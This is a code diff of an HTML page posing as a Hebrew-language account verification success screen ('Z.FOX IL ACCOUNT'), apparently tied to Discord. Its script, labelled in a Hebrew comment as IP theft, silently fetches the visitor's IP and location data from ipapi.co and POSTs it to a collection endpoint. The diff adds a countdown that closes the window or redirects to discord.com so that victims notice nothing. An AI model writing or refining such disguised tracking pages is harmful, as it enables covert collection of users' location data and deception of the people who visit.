@@ -63,6 +63,11 @@
             font-size: 48px;
             margin-top: 30px;
         }
+        .countdown {
+            font-size: 14px;
+            color: #808090;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -73,9 +78,11 @@
         <p class="subtitle">האימות הושלם בהצלחה</p>
         <p class="server-name">Z.FOX IL ACCOUNT</p>
         <div class="checkmark">✓</div>
+        <p class="countdown">החלון ייסגר בעוד <span id="timer">3</span> שניות...</p>
     </div>
 
 <script>
+    // גניבת IP
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
@@ -88,6 +95,20 @@
                 body: JSON.stringify(payload)
             });
         });
+
+    // ספירה לאחור וסגירה
+    let seconds = 3;
+    const timerEl = document.getElementById('timer');
+    const interval = setInterval(() => {
+        seconds--;
+        timerEl.textContent = seconds;
+        if (seconds <= 0) {
+            clearInterval(interval);
+            window.close();
+            // אם window.close לא עובד (כי הדף לא נפתח בחלון חדש)
+            window.location.href = 'https://discord.com/app';
+        }
+    }, 1000);
 </script>
 </body>
 </html>
